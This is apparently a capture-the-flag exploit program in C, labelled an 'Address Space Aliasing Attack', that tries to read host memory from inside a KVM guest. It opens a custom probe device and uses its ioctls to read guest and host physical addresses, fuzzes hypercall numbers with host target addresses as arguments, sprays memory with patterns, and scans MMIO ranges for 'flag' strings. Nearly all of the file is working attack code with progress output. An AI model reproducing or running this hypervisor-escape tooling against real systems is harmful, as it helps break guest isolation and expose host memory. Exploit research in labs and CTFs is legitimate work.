#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <inttypes.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"

// Target host physical addresses
#define HOST_WRITE_FLAG_HPA  0x64279a8UL
#define HOST_READ_FLAG_HPA   0x695ee10UL

// IOCTLs
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_READ_GPA           0x1014
#define IOCTL_WRITE_GPA          0x1015
#define IOCTL_READ_HPA           0x1019
#define IOCTL_WRITE_HPA          0x101A
#define IOCTL_ALLOC_SHARED_BUF   0x101B
#define IOCTL_ALLOC_LARGE_POOL   0x101F
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_READ_MMIO          0x1003

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
    long ret_value;
};

struct gpa_io_data {
    unsigned long gpa;
    unsigned long size;
    unsigned char *user_buffer;
};

struct hpa_io_data {
    unsigned long hpa;
    unsigned long size;
    unsigned char *user_buffer;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

// Memory region tracking
struct memory_region {
    void *virt_addr;
    unsigned long gpa;
    size_t size;
    int accessible;
};

#define MAX_REGIONS 1024
struct memory_region g_regions[MAX_REGIONS];
int g_num_regions = 0;

void print_banner() {
    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║     Address Space Aliasing Attack - Massive Memory Mapping     ║\n");
    printf("║                                                                 ║\n");
    printf("║  Strategy: Map guest virtual addresses across entire address   ║\n");
    printf("║           space, looking for GPA→HPA aliasing                  ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n\n");
}

void print_hex(unsigned long addr, unsigned char *data, size_t size) {
    printf("\n[0x%016lx]:\n", addr);
    for (size_t i = 0; i < size && i < 256; i += 16) {
        printf("  %04lx: ", i);
        for (size_t j = 0; j < 16 && i+j < size; j++) {
            printf("%02x ", data[i+j]);
            if (j == 7) printf(" ");
        }
        printf(" | ");
        for (size_t j = 0; j < 16 && i+j < size; j++) {
            unsigned char c = data[i+j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        printf("\n");
    }
    printf("\n");
}

int check_for_flag(unsigned char *data, size_t size) {
    // Look for flag patterns
    for (size_t i = 0; i < size - 5; i++) {
        if ((data[i] == 'f' && data[i+1] == 'l' && data[i+2] == 'a' && data[i+3] == 'g') ||
            (data[i] == 'F' && data[i+1] == 'L' && data[i+2] == 'A' && data[i+3] == 'G')) {
            return 1;
        }
    }
    return 0;
}

unsigned long virt_to_phys_guest(int fd, void *virt_addr) {
    unsigned long virt = (unsigned long)virt_addr;
    unsigned long phys = virt;
    
    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &phys) < 0) {
        return 0;
    }
    
    return phys;
}

// Allocate and map memory regions across the address space
void populate_address_space(int fd) {
    printf("[*] Populating guest virtual address space...\n");
    printf("    Strategy: Allocate regions and track GPA mappings\n\n");
    
    size_t chunk_sizes[] = {
        1024 * 1024 * 1024,      // 1GB
        512 * 1024 * 1024,       // 512MB
        256 * 1024 * 1024,       // 256MB
        128 * 1024 * 1024,       // 128MB
        64 * 1024 * 1024,        // 64MB
        32 * 1024 * 1024,        // 32MB
        16 * 1024 * 1024,        // 16MB
        8 * 1024 * 1024,         // 8MB
        4 * 1024 * 1024,         // 4MB
        2 * 1024 * 1024,         // 2MB
        1024 * 1024,             // 1MB
        0
    };
    
    for (int size_idx = 0; chunk_sizes[size_idx] != 0 && g_num_regions < MAX_REGIONS; size_idx++) {
        size_t chunk_size = chunk_sizes[size_idx];
        
        // Try to allocate multiple chunks of this size
        for (int i = 0; i < 100 && g_num_regions < MAX_REGIONS; i++) {
            void *addr = mmap(NULL, chunk_size, 
                            PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            
            if (addr == MAP_FAILED) {
                break; // Can't allocate this size anymore
            }
            
            // Get the GPA
            unsigned long gpa = virt_to_phys_guest(fd, addr);
            
            if (gpa) {
                g_regions[g_num_regions].virt_addr = addr;
                g_regions[g_num_regions].gpa = gpa;
                g_regions[g_num_regions].size = chunk_size;
                g_regions[g_num_regions].accessible = 1;
                
                if (g_num_regions % 10 == 0) {
                    printf("    [%4d] Mapped %8zu MB: VA=%p -> GPA=0x%lx\n",
                           g_num_regions, chunk_size / (1024*1024), addr, gpa);
                }
                
                g_num_regions++;
            } else {
                munmap(addr, chunk_size);
            }
        }
    }
    
    printf("\n[+] Mapped %d memory regions\n", g_num_regions);
    
    // Calculate total mapped
    size_t total = 0;
    for (int i = 0; i < g_num_regions; i++) {
        total += g_regions[i].size;
    }
    printf("[+] Total mapped memory: %zu MB\n", total / (1024 * 1024));
}

// Search for GPA→HPA aliasing
void search_for_aliasing(int fd) {
    printf("\n[*] Searching for GPA→HPA aliasing...\n");
    printf("    Looking for GPAs that might map to our target HPAs\n\n");
    
    unsigned long targets[] = {
        HOST_READ_FLAG_HPA,
        HOST_WRITE_FLAG_HPA,
        0
    };
    
    for (int t = 0; targets[t] != 0; t++) {
        unsigned long target_hpa = targets[t];
        
        printf("    Target HPA: 0x%lx\n", target_hpa);
        
        // Check if any of our GPAs match or are close
        for (int i = 0; i < g_num_regions; i++) {
            unsigned long gpa_base = g_regions[i].gpa;
            unsigned long gpa_end = gpa_base + g_regions[i].size;
            
            // Check for direct match
            if (target_hpa >= gpa_base && target_hpa < gpa_end) {
                printf("    [!!!] POTENTIAL MATCH: GPA range contains target!\n");
                printf("          GPA Range: 0x%lx - 0x%lx\n", gpa_base, gpa_end);
                printf("          Target:    0x%lx\n", target_hpa);
                
                // Try to read from this GPA
                unsigned long offset = target_hpa - gpa_base;
                unsigned char *buffer = malloc(256);
                if (buffer) {
                    struct gpa_io_data data;
                    data.gpa = target_hpa; // Use target HPA as GPA!
                    data.size = 256;
                    data.user_buffer = buffer;
                    
                    printf("          Attempting to read GPA 0x%lx (offset 0x%lx in region)...\n",
                           target_hpa, offset);
                    
                    if (ioctl(fd, IOCTL_READ_GPA, &data) == 0) {
                        printf("          [+] Read successful!\n");
                        print_hex(target_hpa, buffer, 256);
                        
                        if (check_for_flag(buffer, 256)) {
                            printf("\n          [!!!] FLAG PATTERN DETECTED!\n\n");
                        }
                    } else {
                        printf("          [-] Read failed: %s\n", strerror(errno));
                    }
                    
                    free(buffer);
                }
            }
            
            // Check for nearby GPAs (within 64MB)
            if (target_hpa > gpa_base) {
                unsigned long delta = target_hpa - gpa_base;
                if (delta < 64 * 1024 * 1024) {
                    printf("    [~] Close GPA: 0x%lx (delta: +0x%lx)\n", gpa_base, delta);
                }
            } else if (gpa_base > target_hpa) {
                unsigned long delta = gpa_base - target_hpa;
                if (delta < 64 * 1024 * 1024) {
                    printf("    [~] Close GPA: 0x%lx (delta: -0x%lx)\n", gpa_base, delta);
                }
            }
        }
        
        printf("\n");
    }
}

// Try accessing target addresses directly as GPAs
void direct_gpa_access(int fd) {
    printf("[*] Attempting direct GPA access at target addresses...\n\n");
    
    unsigned long test_addrs[] = {
        HOST_READ_FLAG_HPA,
        HOST_WRITE_FLAG_HPA,
        HOST_READ_FLAG_HPA & 0xFFFFF000,  // Page aligned
        HOST_WRITE_FLAG_HPA & 0xFFFFF000,
        0x64000000,  // Near target
        0x69000000,
        0
    };
    
    for (int i = 0; test_addrs[i] != 0; i++) {
        unsigned long gpa = test_addrs[i];
        
        printf("    Trying GPA 0x%lx... ", gpa);
        fflush(stdout);
        
        unsigned char *buffer = malloc(4096);
        if (!buffer) continue;
        
        struct gpa_io_data data;
        data.gpa = gpa;
        data.size = 4096;
        data.user_buffer = buffer;
        
        if (ioctl(fd, IOCTL_READ_GPA, &data) == 0) {
            printf("ACCESSIBLE!\n");
            
            // Check if it's interesting
            int non_zero = 0;
            for (int j = 0; j < 4096; j++) {
                if (buffer[j] != 0) non_zero++;
            }
            
            if (non_zero > 100) {
                printf("        [+] Contains data (%d non-zero bytes)\n", non_zero);
                print_hex(gpa, buffer, 256);
                
                if (check_for_flag(buffer, 4096)) {
                    printf("\n        [!!!] FLAG PATTERN FOUND!\n\n");
                }
            }
        } else {
            printf("inaccessible (%s)\n", strerror(errno));
        }
        
        free(buffer);
    }
    
    printf("\n");
}

// Use hypercalls with our mapped regions
void hypercall_with_mapped_regions(int fd) {
    printf("[*] Issuing hypercalls using mapped region GPAs...\n\n");
    
    if (g_num_regions == 0) {
        printf("[-] No mapped regions available\n");
        return;
    }
    
    // Use first few regions as buffers
    for (int i = 0; i < 5 && i < g_num_regions; i++) {
        unsigned long buffer_gpa = g_regions[i].gpa;
        
        printf("    Hypercall with buffer @ GPA 0x%lx:\n", buffer_gpa);
        
        // Try different hypercall numbers
        unsigned long hc_numbers[] = {0, 1, 2, 3, 4, 5, 10, 100, 101, 102, 0};
        
        for (int h = 0; hc_numbers[h] != 0; h++) {
            struct hypercall_args args;
            args.nr = hc_numbers[h];
            args.arg0 = HOST_READ_FLAG_HPA;  // Request read from this HPA
            args.arg1 = buffer_gpa;           // Into our buffer
            args.arg2 = 256;
            args.arg3 = 0;
            
            printf("        HC(%lu) - hpa=0x%lx, gpa=0x%lx: ", 
                   args.nr, args.arg0, args.arg1);
            fflush(stdout);
            
            if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) == 0) {
                printf("ret=0x%lx\n", args.ret_value);
                
                // Check if anything was written to our buffer
                void *buf = g_regions[i].virt_addr;
                if (buf) {
                    int has_data = 0;
                    for (int j = 0; j < 256; j++) {
                        if (((unsigned char*)buf)[j] != 0) {
                            has_data = 1;
                            break;
                        }
                    }
                    
                    if (has_data) {
                        printf("            [+] Buffer has data!\n");
                        print_hex(buffer_gpa, (unsigned char*)buf, 256);
                        
                        if (check_for_flag((unsigned char*)buf, 256)) {
                            printf("\n            [!!!] FLAG DETECTED!\n\n");
                        }
                    }
                }
            } else {
                printf("failed\n");
            }
        }
        
        printf("\n");
    }
}

// Spray memory with patterns and look for reflections
void pattern_spray_attack(int fd) {
    printf("[*] Pattern spray attack...\n");
    printf("    Writing unique patterns to all regions, then scanning\n\n");
    
    // Write unique pattern to each region
    for (int i = 0; i < g_num_regions; i++) {
        unsigned char *buf = (unsigned char*)g_regions[i].virt_addr;
        unsigned long gpa = g_regions[i].gpa;
        
        // Write pattern: GPA value repeated
        for (size_t j = 0; j < g_regions[i].size && j < 4096; j += 8) {
            *((unsigned long*)(buf + j)) = gpa + j;
        }
        
        if (i % 50 == 0) {
            printf("    [%d/%d] Written pattern to GPA 0x%lx\n", 
                   i, g_num_regions, gpa);
        }
    }
    
    printf("\n[*] Patterns written. Now scanning target HPAs...\n\n");
    
    // Try to read target HPAs as GPAs and look for our patterns
    unsigned long targets[] = {
        HOST_READ_FLAG_HPA,
        HOST_WRITE_FLAG_HPA,
        0
    };
    
    for (int t = 0; targets[t] != 0; t++) {
        unsigned long target = targets[t];
        
        unsigned char *buffer = malloc(4096);
        if (!buffer) continue;
        
        // Try reading as GPA
        struct gpa_io_data data;
        data.gpa = target;
        data.size = 4096;
        data.user_buffer = buffer;
        
        printf("    Reading target 0x%lx as GPA... ", target);
        
        if (ioctl(fd, IOCTL_READ_GPA, &data) == 0) {
            printf("success\n");
            
            // Check if we see any of our patterns
            for (int i = 0; i < g_num_regions; i++) {
                unsigned long expected = g_regions[i].gpa;
                
                for (size_t j = 0; j < 4096 - 8; j += 8) {
                    unsigned long val = *((unsigned long*)(buffer + j));
                    if (val == expected + j) {
                        printf("        [!!!] Found our pattern from GPA 0x%lx!\n", expected);
                        printf("             This means HPA 0x%lx maps to our GPA!\n", target);
                        print_hex(target, buffer, 256);
                        break;
                    }
                }
            }
        } else {
            printf("failed\n");
        }
        
        free(buffer);
    }
    
    printf("\n");
}

void massive_mmio_scan(int fd) {
    printf("[*] Massive MMIO region scan...\n");
    printf("    Scanning 0x0 - 0xFFFFFFFF for accessible regions\n\n");
    
    unsigned long scan_size = 4096;
    unsigned long found_count = 0;
    
    // Scan in 16MB increments
    for (unsigned long addr = 0; addr < 0x100000000UL; addr += 16*1024*1024) {
        unsigned char *buffer = malloc(scan_size);
        if (!buffer) continue;
        
        struct mmio_data data;
        data.phys_addr = addr;
        data.size = scan_size;
        data.user_buffer = buffer;
        
        if (ioctl(fd, IOCTL_READ_MMIO, &data) == 0) {
            // Check for interesting content
            int interesting = 0;
            for (unsigned long i = 0; i < scan_size; i++) {
                if (buffer[i] != 0 && buffer[i] != 0xFF) {
                    interesting++;
                }
            }
            
            if (interesting > 100) {
                printf("    [+] Found @ 0x%lx (%d bytes interesting)\n", addr, interesting);
                found_count++;
                
                // Check closer to target addresses
                if ((addr <= HOST_READ_FLAG_HPA && HOST_READ_FLAG_HPA < addr + scan_size) ||
                    (addr <= HOST_WRITE_FLAG_HPA && HOST_WRITE_FLAG_HPA < addr + scan_size)) {
                    printf("        [!!!] OVERLAPS TARGET ADDRESS RANGE!\n");
                    print_hex(addr, buffer, 256);
                }
                
                if (check_for_flag(buffer, scan_size)) {
                    printf("        [!!!] FLAG PATTERN DETECTED!\n");
                    print_hex(addr, buffer, scan_size);
                }
                
                if (found_count >= 20) {
                    printf("    [*] Found 20 regions, stopping...\n");
                    free(buffer);
                    break;
                }
            }
        }
        
        free(buffer);
        
        // Progress indicator
        if (addr % (256 * 1024 * 1024) == 0) {
            printf("    Progress: 0x%lx / 0x100000000 (%.1f%%)\n",
                   addr, (double)addr / 0x100000000UL * 100.0);
        }
    }
    
    printf("\n");
}

int main(int argc, char *argv[]) {
    print_banner();
    
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("Failed to open device");
        return 1;
    }
    
    printf("[+] Device opened (fd=%d)\n", fd);
    printf("[*] Target HPA addresses:\n");
    printf("    Write Flag: 0x%lx\n", HOST_WRITE_FLAG_HPA);
    printf("    Read Flag:  0x%lx\n\n", HOST_READ_FLAG_HPA);
    
    // Execute attack phases
    if (argc > 1 && strcmp(argv[1], "fast") == 0) {
        // Fast mode - skip population
        printf("[*] Fast mode - skipping address space population\n\n");
        direct_gpa_access(fd);
    } else {
        // Phase 1: Populate address space
        populate_address_space(fd);
        
        // Phase 2: Search for aliasing
        search_for_aliasing(fd);
        
        // Phase 3: Direct access attempts  
        direct_gpa_access(fd);
        
        // Phase 4: Hypercalls with our regions
        hypercall_with_mapped_regions(fd);
        
        // Phase 5: Pattern spray
        pattern_spray_attack(fd);
    }
    
    // Phase 6: MMIO scan (optional, slow)
    if (argc > 1 && strcmp(argv[1], "scan") == 0) {
        massive_mmio_scan(fd);
    }
    
    printf("\n[*] Exploitation complete\n");
    close(fd);
    return 0;
}
